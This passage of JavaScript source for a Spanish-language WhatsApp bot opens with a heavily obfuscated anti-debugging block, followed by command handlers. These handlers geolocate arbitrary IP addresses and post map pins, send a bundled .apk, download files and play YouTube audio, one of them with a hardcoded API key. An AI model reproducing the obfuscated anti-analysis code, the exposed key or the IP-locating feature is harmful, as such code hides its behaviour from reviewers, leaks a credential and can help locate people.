_0x2987a2(_0x4bef54-0xe,_0x22b785-0x17c,_0x21e133-0x336,_0x5b3f84,_0x1de053-0x89);},_0x403827=function(_0x4431c6,_0x5c951f,_0x26f688,_0x16e595,_0x13f0bc){return _0x52408c(_0x4431c6-0x112,_0x5c951f-0xa,_0x26f688-0x336,_0x16e595,_0x13f0bc-0x1e8);},_0x840152=function(_0x3232f3,_0x520966,_0x10914e,_0x5aea7f,_0x242347){return _0x2b064e(_0x3232f3-0xe0,_0x520966-0xe1,_0x10914e-0x336,_0x5aea7f,_0x242347-0x13f);},_0x230307={};_0x230307[_0x4c3b57(0x222,0x1da,0x1da,0x1d7,0x19b)]=_0x4c3b57(0x1b8,0x1f4,0x1ed,0x295,0x288)+_0x35c474(0x122,0x112,0x11b,0x18f,0xa0)+_0x4c3b57(0x1d3,0x106,0x171,0xfe,0x143)+_0x25c359(0x17b,0xe3,0x100,0x165,0x122)+'/',_0x230307[_0x403827(0x206,0x215,0x1de,0x161,0x171)]=_0x840152(0x2ac,0x17e,0x210,0x16a,0x202)+_0x4c3b57(0x133,0x125,0x11d,0x13b,0x1ba)+_0x25c359(0x130,0x196,0x152,0xb0,0x1ab)+_0x35c474(0x179,0x134,0x16f,0x148,0x115)+_0x403827(0x13d,0x1f9,0x178,0x1db,0x10c),_0x230307[_0x403827(0x14c,0x168,0x15d,0x1cc,0x1c1)]=function(_0x6c7f1a,_0x3bead0){return _0x6c7f1a===_0x3bead0;},_0x230307[_0x4c3b57(0x1e8,0x196,0x144,0x138,0x110)]=_0x4c3b57(0x189,0x1c0,0x18f,0x139,0xfd),_0x230307[_0x403827(0xde,0x229,0x182,0x147,0x118)]=_0x840152(0x117,0x10d,0x167,0x116,0x14c),_0x230307[_0x25c359(0x123,0x1ad,0x1c9,0x228,0x1d9)]=_0x840152(0x226,0x166,0x20d,0x20c,0x289)+_0x25c359(0x184,0x19a,0x200,0x197,0x263)+_0x840152(0x238,0x11d,0x19c,0x143,0x13f)+')',_0x230307[_0x840152(0xfa,0x12f,0x15c,0x1c5,0x155)]=_0x403827(0x1ee,0x103,0x149,0xb7,0x1ab)+_0x25c359(0x12b,0x1f3,0x1b9,0x1d4,0x25e)+_0x4c3b57(0xe6,0x212,0x172,0x129,0x19c)+_0x35c474(0x73,0x14f,0xf9,0xf0,0x7e)+_0x25c359(0x161,0x10f,0x19d,0x11a,0xf7)+_0x403827(0x121,0x15c,0x14d,0x1a5,0x119)+_0x35c474(0x208,0x1d3,0x1d5,0x1f9,0x224),_0x230307[_0x403827(0x1e3,0x181,0x1a5,0x1f8,0x18c)]=function(_0x1e6fb1,_0x223ce9){return _0x1e6fb1(_0x223ce9);},_0x230307[_0x4c3b57(0xb8,0x14f,0x114,0x96,0x121)]=_0x840152(0x13e,0x18a,0xf4,0xe4,0x88),_0x230307[_0x840152(0x1ca,0x21b,0x1ec,0x183,0x16a)]=function(_0x39a80c,_0x2523e5){return _0x39a80c+_0x2523e5;},_0x230307[_0x4c3b57(0x1fe,0x223,0x18b,0x154,0x150)]=_0x840152(0x1f5,0x173,0x213,0x25c,0x16e),_0x230307[_0x35c474(0x2ac,0x258,0x230,0x2cb,0x29c)]=function(_0x68323,_0x4c4a50){return _0x68323+_0x4c4a50;},_0x230307[_0x840152(0x1a4,0x14b,0x121,0x95,0x1bf)]=_0x840152(0x274,0x1cf,0x231,0x296,0x268),_0x230307[_0x840152(0x283,0x286,0x22b,0x255,0x22b)]=function(_0x277dea){return _0x277dea();},_0x230307[_0x840152(0x174,0x20e,0x1b2,0x1f0,0x153)]=function(_0x2116d4,_0x315171){return _0x2116d4===_0x315171;},_0x230307[_0x25c359(0x229,0x1e1,0x181,0x1a5,0x20e)]=_0x403827(0x6f,0x64,0xfa,0x166,0x189),_0x230307[_0x840152(0x132,0x1b9,0x18e,0x175,0x221)]=_0x4c3b57(0xbf,0xbb,0x150,0xcd,0x1d9),_0x230307[_0x35c474(0x1f1,0x2a0,0x232,0x1ee,0x18e)]=function(_0xb991d7,_0x4e20f0){return _0xb991d7(_0x4e20f0);},_0x230307[_0x840152(0x275,0x17f,0x226,0x228,0x194)]=_0x35c474(0x1a0,0x21e,0x1ed,0x253,0x27a)+_0x840152(0x19c,0x167,0x191,0x11d,0x1c9)+_0x25c359(0xc5,0xb8,0xfb,0x111,0x12c)+_0x35c474(0x1cf,0x140,0x1d3,0x19c,0x1d5),_0x230307[_0x35c474(0x261,0x1f8,0x1d9,0x170,0x27a)]=_0x403827(0x211,0x292,0x1fd,0x1b7,0x1ed)+_0x840152(0x22c,0x15b,0x1c7,0x1f9,0x1ec)+_0x4c3b57(0x15c,0x260,0x1e6,0x214,0x1a0)+_0x403827(0x181,0x117,0x1b1,0x24f,0x250)+_0x35c474(0x1f6,0x189,0x163,0x1c5,0x1d6)+_0x403827(0x1ee,0x1cc,0x158,0x19f,0x17f)+'\x20)',_0x230307[_0x25c359(0x134,0x148,0x141,0x1d6,0x15a)]=function(_0x28d858,_0xf6977b){return _0x28d858===_0xf6977b;},_0x230307[_0x840152(0x1c5,0x1f9,0x1af,0x195,0x1b2)]=_0x25c359(0x1ff,0x1bb,0x1ef,0x1da,0x19a),_0x230307[_0x403827(0x132,0x14c,0x16b,0x177,0x13b)]=_0x840152(0x178,0x157,0x1ac,0x175,0x18a),_0x230307[_0x840152(0x15e,0x23a,0x1f5,0x1b7,0x1e6)]=_0x25c359(0x1e4,0x204,0x242,0x1d4,0x2cf)+'g',_0x230307[_0x25c359(0x1b3,0x12f,0x174,0x15f,0x1dd)]=function(_0x52bfff,_0xef3fc1){return _0x52bfff===_0xef3fc1;},_0x230307[_0x840152(0x14b,0x141,0x130,0x16b,0x148)]=_0x840152(0x1c8,0x1ea,0x197,0x1a7,0x112),_0x230307[_0x25c359(0x182,0x1c2,0x161,0x117,0x1c1)]=_0x35c474(0x29e,0x20f,0x1f8,0x17b,0x239)+_0x840152(0x22d,0x170,0x1c5,0x24b,0x13c)+_0x25c359(0x1be,0x1c8,0x1be,0x121,0x239),_0x230307[_0x25c359(0x1f4,0x1a0,0x22d,0x224,0x2c3)]=_0x35c474(0x19e,0x211,0x1c2,0x1a7,0x1ba)+'er',_0x230307[_0x403827(0x158,0x116,0xfc,0xbf,0x112)]=function(_0x170b44,_0x56a83a){return _0x170b44===_0x56a83a;},_0x230307[_0x4c3b57(0x249,0x1a0,0x1ba,0x19a,0x262)]=_0x25c359(0x1d4,0xdd,0x180,0x12d,0xdb),_0x230307[_0x25c359(0x15a,0x1d7,0x183,0x14d,0x12f)]=_0x403827(0x1bb,0x169,0x1a8,0x205,0x11e),_0x230307[_0x25c359(0x1cd,0x1ac,0x1c8,0x133,0x1c2)]=function(_0x1c1937,_0xc44f07){return _0x1c1937!==_0xc44f07;},_0x230307[_0x4c3b57(0x132,0x137,0x199,0x128,0x106)]=function(_0x159a97,_0x257e4d){return _0x159a97+_0x257e4d;},_0x230307[_0x403827(0x1e3,0x167,0x179,0xdf,0x20b)]=function(_0x445fc5,_0xb9ee1a){return _0x445fc5/_0xb9ee1a;},_0x230307[_0x25c359(0x1b3,0xf9,0x156,0x1b6,0x153)]=_0x4c3b57(0x194,0x1f1,0x169,0x1e6,0xef)+'h',_0x230307[_0x4c3b57(0x19c,0x67,0x10a,0xea,0x18a)]=function(_0x5a05bb,_0x26c963){return _0x5a05bb===_0x26c963;},_0x230307[_0x25c359(0x18d,0x116,0x132,0x137,0x180)]=function(_0x403b96,_0x614acd){return _0x403b96%_0x614acd;},_0x230307[_0x35c474(0x170,0x1ff,0x192,0x12c,0x17a)]=function(_0xb9f2ac,_0x49f883){return _0xb9f2ac!==_0x49f883;},_0x230307[_0x403827(0x1a3,0x271,0x238,0x22c,0x1f1)]=_0x403827(0xde,0x1b3,0x11e,0xdf,0x11a),_0x230307[_0x403827(0x27a,0x209,0x224,0x263,0x288)]=_0x403827(0x1a8,0x201,0x1f2,0x185,0x254),_0x230307[_0x840152(0x264,0x1ec,0x1e2,0x275,0x20a)]=_0x4c3b57(0x252,0x1bb,0x1ad,0x22a,0x24d),_0x230307[_0x4c3b57(0x8e,0x19d,0x129,0xdf,0x146)]=_0x403827(0xe1,0x152,0x108,0xad,0x7d),_0x230307[_0x35c474(0x2b1,0x1f1,0x225,0x281,0x221)]=_0x25c359(0x18d,0xdf,0x10d,0x167,0x16f)+'n',_0x230307[_0x35c474(0x77,0x82,0x110,0x150,0xff)]=function(_0x11a428,_0x2eeab7){return _0x11a428!==_0x2eeab7;},_0x230307[_0x25c359(0x155,0x1f5,0x1cd,0x16b,0x1e0)]=_0x4c3b57(0x148,0x1e3,0x1f0,0x21a,0x246),_0x230307[_0x4c3b57(0xba,0x1b1,0x135,0x1c5,0xe8)]=_0x25c359(0x1e5,0xf9,0x1a1,0x1dd,0x1ca)+_0x4c3b57(0x209,0x19d,0x1eb,0x273,0x22c)+'t',_0x230307[_0x840152(0x160,0x1bc,0x15e,0x12f,0x1f0)]=function(_0x14f0bf,_0x34e270){return _0x14f0bf(_0x34e270);},_0x230307[_0x840152(0x213,0x15a,0x190,0x1cd,0x11d)]=function(_0x2db2ad,_0x3e1f58){return _0x2db2ad!==_0x3e1f58;},_0x230307[_0x25c359(0x173,0xe9,0x17b,0x178,0x1f5)]=_0x35c474(0x12e,0x1a8,0x133,0xa1,0x130),_0x230307[_0x25c359(0x19e,0x154,0x147,0x19d,0x18c)]=function(_0x3a020,_0x722ee){return _0x3a020!==_0x722ee;},_0x230307[_0x403827(0x16b,0xd5,0x106,0xdb,0xbe)]=_0x403827(0x7f,0x17a,0x10f,0x6d,0x1b4),_0x230307[_0x840152(0x197,0x272,0x221,0x201,0x1bb)]=_0x840152(0x1f4,0x26e,0x1e1,0x194,0x1fd),_0x230307[_0x4c3b57(0x16d,0x22d,0x186,0x1e7,0x15c)]=function(_0x2aea3a,_0x13e61d){return _0x2aea3a!==_0x13e61d;},_0x230307[_0x25c359(0x96,0xa2,0x116,0xf4,0x9b)]=_0x840152(0x14c,0x212,0x1f4,0x15f,0x168),_0x230307[_0x403827(0x99,0x122,0x112,0xd4,0xf3)]=_0x840152(0x1e1,0xfb,0x173,0x20a,0x117);const _0xa92ec9=_0x230307;function _0x4a6aa7(_0x4a5b07){const _0x388824=function(_0x17310d,_0x1a4e5f,_0x572909,_0x4dcfd1,_0x4bf376){return _0x25c359(_0x17310d-0x1b2,_0x1a4e5f-0xa3,_0x4dcfd1-0x37d,_0x572909,_0x4bf376-0x12e);},_0x2100b2=function(_0x4f5271,_0x3055a1,_0x1d5245,_0x3bc16d,_0x341ca3){return _0x35c474(_0x4f5271-0x6b,_0x3055a1-0x10,_0x3bc16d-0x37d,_0x1d5245,_0x341ca3-0x19e);},_0x2b53bb=function(_0x57f637,_0x2c066d,_0x52b7bb,_0x422b8e,_0x4f5c97){return _0x403827(_0x57f637-0x156,_0x2c066d-0x7e,_0x422b8e-0x37d,_0x52b7bb,_0x4f5c97-0x19);},_0x3511c0=function(_0x1100ee,_0x150f0a,_0xac316d,_0x24de07,_0x105b8a){return _0x35c474(_0x1100ee-0x76,_0x150f0a-0x116,_0x24de07-0x37d,_0xac316d,_0x105b8a-0x115);},_0x2660aa=function(_0x3714f9,_0x3adea7,_0xb04aee,_0x1270cc,_0x512094){return _0x35c474(_0x3714f9-0x47,_0x3adea7-0xa2,_0x1270cc-0x37d,_0xb04aee,_0x512094-0x2c);},_0x29d934={};_0x29d934[_0x388824(0x573,0x4ff,0x495,0x4e9,0x4d4)]=function(_0x188feb,_0x334ea9){const _0x333593=function(_0x566d13,_0x481c23,_0x2b8251,_0x428bc9,_0x336136){return _0x388824(_0x566d13-0x9f,_0x481c23-0x1aa,_0x481c23,_0x566d13-0x2f2,_0x336136-0xee);};return _0xa92ec9[_0x333593(0x8a1,0x86e,0x863,0x85a,0x808)](_0x188feb,_0x334ea9);},_0x29d934[_0x388824(0x523,0x53f,0x550,0x4c5,0x436)]=function(_0x789c58,_0x336e99){const _0x4a90c6=function(_0x4b3386,_0x5892cd,_0x4886ad,_0x219317,_0x490d2b){return _0x2100b2(_0x4b3386-0x1e1,_0x5892cd-0xed,_0x4886ad,_0x490d2b-0x1f8,_0x490d2b-0x8c);};return _0xa92ec9[_0x4a90c6(0x7d7,0x79e,0x7d5,0x76f,0x7a5)](_0x789c58,_0x336e99);},_0x29d934[_0x388824(0x53b,0x55d,0x510,0x574,0x4f6)]=_0xa92ec9[_0x388824(0x545,0x646,0x617,0x5a3,0x5e8)],_0x29d934[_0x3511c0(0x595,0x5fd,0x655,0x5b7,0x5a5)]=_0xa92ec9[_0x2b53bb(0x4c0,0x582,0x5b2,0x556,0x57f)];const _0x4121be=_0x29d934;if(_0xa92ec9[_0x2660aa(0x459,0x45e,0x548,0x4be,0x4e5)](_0xa92ec9[_0x2660aa(0x55a,0x4a4,0x4fb,0x52c,0x5c9)],_0xa92ec9[_0x2100b2(0x450,0x577,0x535,0x4e8,0x536)])){const _0x1e3c46=_0x52fbf3[_0x388824(0x5c9,0x541,0x4cd,0x56e,0x585)](_0x1e5758,arguments);return _0x129536=null,_0x1e3c46;}else{if(_0xa92ec9[_0x3511c0(0x506,0x443,0x418,0x4be,0x551)](typeof _0x4a5b07,_0xa92ec9[_0x2660aa(0x4d6,0x5be,0x560,0x572,0x583)])){if(_0xa92ec9[_0x3511c0(0x53d,0x4a7,0x483,0x4f1,0x598)](_0xa92ec9[_0x2b53bb(0x496,0x4f7,0x4ef,0x4ad,0x48c)],_0xa92ec9[_0x2660aa(0x515,0x466,0x43e,0x4ad,0x53b)]))return function(_0x3df67b){}[_0x2660aa(0x634,0x5e9,0x5b6,0x59a,0x5d3)+_0x2100b2(0x433,0x4c7,0x523,0x4b9,0x532)+'r'](_0xa92ec9[_0x2b53bb(0x510,0x532,0x55e,0x4de,0x48f)])[_0x2b53bb(0x4ff,0x526,0x4ff,0x56e,0x51e)](_0xa92ec9[_0x388824(0x58e,0x59e,0x5e7,0x5aa,0x558)]);else{if(_0x466901){const _0x520092=_0x2cad97[_0x2100b2(0x4f8,0x4cd,0x593,0x56e,0x581)](_0x753f25,arguments);return _0x4dd31c=null,_0x520092;}}}else{if(_0xa92ec9[_0x2100b2(0x4ae,0x504,0x44c,0x479,0x495)](_0xa92ec9[_0x2660aa(0x527,0x4fb,0x554,0x537,0x4ba)],_0xa92ec9[_0x388824(0x45a,0x50f,0x4bb,0x500,0x4ba)])){const _0x109980=_0x35135c[_0x2b53bb(0x606,0x519,0x59a,0x59a,0x622)+_0x2100b2(0x52f,0x468,0x491,0x4b9,0x491)+'r'](_0xa92ec9[_0x2b53bb(0x520,0x581,0x52b,0x557,0x5ec)])()[_0x3511c0(0x5b4,0x538,0x55e,0x59a,0x642)+_0x3511c0(0x4cb,0x47a,0x46f,0x4b9,0x47a)+'r'](_0xa92ec9[_0x2660aa(0x56f,0x4f9,0x4d9,0x55b,0x53c)]);return!_0x109980[_0x388824(0x4fb,0x5fe,0x5da,0x584,0x50d)](_0x152df1);}else{if(_0xa92ec9[_0x2100b2(0x4c8,0x538,0x4bc,0x545,0x53a)](_0xa92ec9[_0x2660aa(0x4d4,0x54b,0x579,0x516,0x575)]('',_0xa92ec9[_0x2100b2(0x480,0x511,0x495,0x4f6,0x4bc)](_0x4a5b07,_0x4a5b07))[_0xa92ec9[_0x2100b2(0x4a7,0x52b,0x4e3,0x4d3,0x4e4)]],-0x216d+0x67*-0x22+0x2f1c)||_0xa92ec9[_0x3511c0(0x4a7,0x510,0x416,0x487,0x4f5)](_0xa92ec9[_0x2100b2(0x478,0x46e,0x557,0x4af,0x442)](_0x4a5b07,-0x1*-0x5f9+-0x1*-0x3b5+0x99a*-0x1),0x1*0x16f+-0x1*0x1cd+-0x2*-0x2f)){if(_0xa92ec9[_0x2660aa(0x4ba,0x50f,0x4c1,0x50f,0x5ae)](_0xa92ec9[_0x2100b2(0x5c6,0x526,0x52a,0x5b5,0x56b)],_0xa92ec9[_0x388824(0x5bb,0x552,0x550,0x5a1,0x56f)]))(function(){const _0x104f30=function(_0xbdfc9d,_0x5edb63,_0x4cfb3f,_0x8db65,_0x366555){return _0x2b53bb(_0xbdfc9d-0x17f,_0x5edb63-0xfa,_0x8db65,_0x4cfb3f-0x1eb,_0x366555-0x6d);},_0x4f3922=function(_0x24a9c9,_0x22dc31,_0xe21259,_0x3d5bdd,_0x36855c){return _0x2b53bb(_0x24a9c9-0x6b,_0x22dc31-0x38,_0x3d5bdd,_0xe21259-0x1eb,_0x36855c-0xad);},_0x3676e0=function(_0x599221,_0x1e1b2c,_0x561bd2,_0x477793,_0x3b4533){return _0x388824(_0x599221-0xbc,_0x1e1b2c-0x14f,_0x477793,_0x561bd2-0x1eb,_0x3b4533-0x15c);},_0x55e8c3=function(_0x1c4daa,_0x9db145,_0x339194,_0x26222f,_0x1025c0){return _0x2b53bb(_0x1c4daa-0x80,_0x9db145-0xf,_0x26222f,_0x339194-0x1eb,_0x1025c0-0x196);},_0x40459f=function(_0x468cee,_0x3471b2,_0x22749e,_0x2c0aa3,_0x30784a){return _0x2100b2(_0x468cee-0x1dc,_0x3471b2-0xad,_0x2c0aa3,_0x22749e-0x1eb,_0x30784a-0x1a9);};if(_0xa92ec9[_0x104f30(0x647,0x714,0x6c5,0x718,0x627)](_0xa92ec9[_0x4f3922(0x738,0x70f,0x6ac,0x70a,0x6a3)],_0xa92ec9[_0x4f3922(0x77e,0x742,0x6ea,0x748,0x68d)])){let _0x3c218d;try{_0x3c218d=_0x4121be[_0x104f30(0x6de,0x6cb,0x6d4,0x74d,0x62d)](_0x414a69,_0x4121be[_0x4f3922(0x676,0x70a,0x6b0,0x730,0x6a5)](_0x4121be[_0x3676e0(0x64f,0x67f,0x6b0,0x628,0x686)](_0x4121be[_0x40459f(0x7f7,0x736,0x75f,0x78f,0x7e2)],_0x4121be[_0x55e8c3(0x794,0x6fe,0x7a2,0x705,0x72b)]),');'))();}catch(_0x301818){_0x3c218d=_0x263393;}return _0x3c218d;}else return!![];}[_0x3511c0(0x5dd,0x57b,0x5af,0x59a,0x564)+_0x3511c0(0x44d,0x50d,0x41b,0x4b9,0x43c)+'r'](_0xa92ec9[_0x3511c0(0x554,0x57a,0x50e,0x516,0x4a5)](_0xa92ec9[_0x388824(0x599,0x5dd,0x572,0x55f,0x57b)],_0xa92ec9[_0x2660aa(0x42b,0x46a,0x52f,0x4a6,0x409)]))[_0x2b53bb(0x3e9,0x4ac,0x516,0x482,0x50d)](_0xa92ec9[_0x2b53bb(0x5b3,0x602,0x510,0x5a2,0x568)]));else{const _0x27a11d=new _0x92b4be(_0xa92ec9[_0x2660aa(0x54a,0x531,0x53f,0x546,0x4fc)]),_0x88804c=new _0x5a54b5(_0xa92ec9[_0x3511c0(0x4d1,0x45f,0x53b,0x4d9,0x53f)],'i'),_0x55c2fb=_0xa92ec9[_0x3511c0(0x509,0x54c,0x58c,0x522,0x5c6)](_0x1f7ebe,_0xa92ec9[_0x388824(0x46f,0x464,0x4aa,0x491,0x4e0)]);!_0x27a11d[_0x2100b2(0x564,0x604,0x508,0x584,0x538)](_0xa92ec9[_0x2100b2(0x5b2,0x600,0x591,0x569,0x5b8)](_0x55c2fb,_0xa92ec9[_0x2100b2(0x465,0x476,0x4a4,0x508,0x46f)]))||!_0x88804c[_0x3511c0(0x583,0x5e6,0x61f,0x584,0x581)](_0xa92ec9[_0x2100b2(0x5fb,0x56b,0x58b,0x5ad,0x593)](_0x55c2fb,_0xa92ec9[_0x2660aa(0x465,0x4b6,0x46c,0x49e,0x48c)]))?_0xa92ec9[_0x388824(0x4a5,0x4e0,0x58e,0x522,0x4b8)](_0x55c2fb,'0'):_0xa92ec9[_0x2b53bb(0x5b3,0x5ab,0x530,0x5a8,0x562)](_0x511ecb);}}else _0xa92ec9[_0x388824(0x404,0x445,0x45e,0x48d,0x4ef)](_0xa92ec9[_0x2660aa(0x4c4,0x56a,0x4b9,0x54a,0x592)],_0xa92ec9[_0x3511c0(0x5d4,0x5cf,0x4b9,0x54a,0x586)])?_0x4121be[_0x2b53bb(0x456,0x52e,0x487,0x4e9,0x58d)](_0x3e9cc3,0xa39+-0x3*0x65+-0x485*0x2):function(){const _0x68515f=function(_0xb79c6c,_0x4e9271,_0x33dfd3,_0x7f9637,_0x3cd95f){return _0x2b53bb(_0xb79c6c-0x124,_0x4e9271-0x187,_0x7f9637,_0x33dfd3- -0x3d8,_0x3cd95f-0xe);},_0x1d3d07=function(_0x20f38f,_0x10fbb1,_0x485b7e,_0x4daf6f,_0x2444a1){return _0x2100b2(_0x20f38f-0x54,_0x10fbb1-0x1e9,_0x4daf6f,_0x485b7e- -0x3d8,_0x2444a1-0x174);},_0x239c09=function(_0x1aa43e,_0x2bf0ab,_0x4e54b8,_0xd111b8,_0x554411){return _0x2100b2(_0x1aa43e-0x8e,_0x2bf0ab-0x1c5,_0xd111b8,_0x4e54b8- -0x3d8,_0x554411-0x16f);};if(_0xa92ec9[_0x68515f(0x1e9,0x164,0x157,0x1ed,0x142)](_0xa92ec9[_0x68515f(0x162,0x10a,0x126,0x115,0xf2)],_0xa92ec9[_0x239c09(0xa7,0xb1,0x133,0xf9,0x1d8)]))_0x36a1d5=_0x559a93;else return![];}[_0x3511c0(0x610,0x613,0x57b,0x59a,0x59a)+_0x2100b2(0x463,0x456,0x4e7,0x4b9,0x55b)+'r'](_0xa92ec9[_0x388824(0x577,0x538,0x4ff,0x516,0x503)](_0xa92ec9[_0x2100b2(0x57e,0x585,0x5ee,0x55f,0x5a5)],_0xa92ec9[_0x388824(0x4c9,0x4fe,0x44f,0x4a6,0x4d0)]))[_0x2100b2(0x5f1,0x4e6,0x56c,0x56e,0x589)](_0xa92ec9[_0x2b53bb(0x4fe,0x44b,0x4b2,0x4b2,0x531)]);}}_0xa92ec9[_0x3511c0(0x557,0x4c9,0x4ba,0x4db,0x555)](_0x4a6aa7,++_0x4a5b07);}}try{if(_0xa92ec9[_0x4c3b57(0x14b,0x1c1,0x190,0xf9,0x190)](_0xa92ec9[_0x35c474(0x156,0xf2,0x17b,0x18e,0x183)],_0xa92ec9[_0x4c3b57(0x201,0x202,0x17b,0x12d,0x100)])){if(_0x3f38b5){const _0x152d3a=_0x31e003[_0x35c474(0x21b,0x168,0x1f1,0x177,0x157)](_0x4fbb14,arguments);return _0x44acdb=null,_0x152d3a;}}else{if(_0x3d0cab){if(_0xa92ec9[_0x840152(0x1e6,0x110,0x147,0x1ed,0x187)](_0xa92ec9[_0x35c474(0x156,0x169,0x106,0xe0,0x146)],_0xa92ec9[_0x403827(0x212,0x1ae,0x221,0x28c,0x20a)]))return _0x4a6aa7;else _0xa92ec9[_0x403827(0x127,0x202,0x15e,0x13a,0xe5)](_0x146119,'0');}else{if(_0xa92ec9[_0x840152(0x1dd,0x199,0x186,0x204,0x220)](_0xa92ec9[_0x403827(0x12c,0xec,0x116,0x1af,0xf2)],_0xa92ec9[_0x35c474(0xb7,0x19a,0x112,0x14f,0x16a)]))_0xa92ec9[_0x4c3b57(0xf7,0x172,0x15e,0x1af,0x157)](_0x4a6aa7,0x30e+-0x3*0x399+0x7bd);else return _0x48ef26;}}}catch(_0x40fb9c){}}
reply(ipbotSm330)
await sleep(200)
reply('*Haciendo lectura* _Json_.... *Tiempo Aproximado:*\n```3 seconds```')
await sleep(200)
datosbot = `*📌Numero del bot:* ${botNumber}

🌍 *ip*: _${ipbot.query}_
      *Latitud de ip*: ${ipbot.lat}
      *Longitud de ip*: ${ipbot.lon}

🌆 *País*: _${ipbot.country}_
      *Código de país*: ${ipbot.countryCode}

🏡 *Región*: _${ipbot.region}_
      *Nombre de región*: ${ipbot.regionName}

🏙️ *Ciudad*: _${ipbot.city}_

📚 *Código postal*: _${ipbot.zip}_

🕐 *Zona horaria*: _${ipbot.timezone}_

🌐 *Proveedor de servicios de Internet*:
_${ipbot.isp}_

🕋 *Organización*: _${ipbot.org}_

${samu}©${ipbot.as}™${samu}`
samu330.sendMessage(from, datosbot, MessageType.text, {quoted: fliveLoc})
await sleep(300)
samu330.sendMessage(from, { degreesLatitude: `${ipbot.lat}`, degreesLongitude: `${ipbot.lon}`, name: '📌Búsqueda por 🐉Samu330🐉', address : `${ipbot.city}`}, MessageType.liveLocation, {quoted : fliveLoc})
break
//localizacion IP Creado por Samu
case 'ip':
ips = args.join(' ')
ip = await getJson(`http://ip-api.com/json/${ips}`)
if(ip.status == 'fail') return reply('*ip incorrecta*')
reply('*Recopilando información.... Tiempo Aproximado:*\n```3 seconds```')
await sleep(200)
datos = `*🔍Ip:* _${ips}_

      *Latitud de ip*: ${ip.lat}
      *Longitud de ip*: ${ip.lon}

🌆 *País*: _${ip.country}_
      *Código de país*: ${ip.countryCode}

🏡 *Región*: _${ip.region}_
      *Nombre de región*: ${ip.regionName}

🏙️  *Ciudad*: _${ip.city}_

📚 *Código postal*: _${ip.zip}_

🕐 *Zona horaria*: _${ip.timezone}_

🌐 *Proveedor de servicios de Internet*:
_${ip.isp}_                                                                                                                                                                                                    
🕋 *Organización*: _${ip.org}_                                                                                                                                                                                  
${samu}©${ip.as}™${samu}`                            
			samu330.sendMessage(from, datos, MessageType.text, {quoted: fliveLoc})
await sleep(300)
/*NO CAMBIAR DATOS NI NOMBRES*/samu330.sendMessage(from, { degreesLatitude: `${ip.lat}`, degreesLongitude: `${ip.lon}`, name: '📌Búsqueda por 🐉Samu330🐉', address : `${ip.city}`}, MessageType.liveLocation, {quoted : fliveLoc})
break

case 'reglas':
reply(`*Hola, estas son las reglas que debes seguir para que no tengas ningun problema con el propietario del bot*\n\n1- _Manten una formalidad respetuosa_\n2- _Si vas a añadir el bot a algun grupo, verifica que el grupo cumpla con los requisitos que son tener minimo 5 personas_\n3- _❌NO AGAS SPAM DE COMANDOS❌_ *Esto es enserio, puedes hacer que el bot se apage*\n4- _📵NO AGAS LLAMADAS POR WHATSAPP AL PROPIETARIO DEL BOT📵_ *Seras bloqueado inmediatamente*\n5- _🕐Espera el tiempo nesesario cuando pidas alguna funcion, ya que algunas tardan en realizarse, no vuelvas a pedir el comando nuevamente hasta que te llege un mensaje de error_\n\nLee las reglas y cumplelas, no te quieras hacer el chistoso, por que no lo eres y ni te sale, asi que porfavor respeta las reglas.`)
break
//Con este case se envia la aplicacion Tutorial
case 'tutorial':
case 'git':
case 'crear':
result = fs.readFileSync(`./media/app.apk`)
samu330.sendMessage(from, result, document, {
mimetype: 'application/vnd.android.package-archive', filename: '🐉AppBot🐉 by 📌Samu330🥀', quoted: fdoc})
reply('*Git de este bot: https://github.com/Samu330/NyanBot*')
break
			
case 'nuevogrupo':
const nombregc = args.join(' ')
if (!nombregc) return reply('*Porfavor escribe el nombre que quieras que tenga el grupo')
const group = await samu330.groupCreate(`${nombregc}`, [sender])
reply(`*EL GRUPO FUE CREADO CORRECTAMENTE CON EL NOMBRE:*\n\n*${nombregc}*\n\nid del grupo: ${group.gid}`)
samu330.sendMessage(group.gid, "hello everyone", MessageType.text, {quoted: fliveLoc})
break
			
case 'hoy':
const momento1 = require('moment-timezone')
const hora = momento1.tz('America/Mexico_City').format('HH:mm:ss')
let d1 = new Date
let locale1 = 'es'
let gmt1 = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let ayer = ['domingo','lunes','Martes','Miercoles','Jueves','Viernes','Sabado'][
Math.floor(((d1 * 1) + gmt1) / 84600000) % 7]
let week1 = d1.toLocaleDateString(locale1, { weekday: 'long' })
let calender1 = d1.toLocaleDateString(locale1, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
reply(`🕐Son las *${hora}*\n\n🍃Hoy es *${week1}  ${calender1}*\n\n_${timeFt}_`)
break

case 'mfire':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length < 1) return reply('y el link?? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Link invalido, el link debe ser de MediaFire')
reply('*Espera un momento...*')
teks = args.join(' ')
const resm = await sm330mfire(teks)
result = `  「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
*Nombre :* ${resm[0].nombre}
*Tamaño :* ${resm[0].size}
*Link :* ${resm[0].link}
_*El archivo se esta enviando......*_`
reply(result)
sendFileFromUrl(resm[0].link, document, {mimetype: resm[0].mime, filename: resm[0].nombre, quoted: fdoc})
break

case 'play':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Me olvide de vivir`)
reply('*Espere un momento...*')
query = args.join(' ')
assistant = fs.readFileSync('./src/img.jpg')
try {
get_result = await getJson(`https://api.lolhuman.xyz/api/ytplay?apikey=ec35353a991a258b05876861&query=${query}`)
get_result = get_result.result
get_info = get_result.info
ini_txt = ` *Titulo* : ${get_info.title}\n`
ini_txt += `•Publicador : ${get_info.uploader}\n`
ini_txt += `•Duracion : ${get_info.duration}\n`
ini_txt += `°Vistas : ${get_info.view}\n`
ini_txt += `°Like : ${get_info.like}\n`
ini_txt += `°Dislike : ${get_info.dislike}\n`
ini_txt += `°Descripcion :\n ${get_info.description}\n\n`
ini_txt += `Si el audio no llega, puede descargar por aqui: :\n ${get_result.audio[3].link}\n\n`
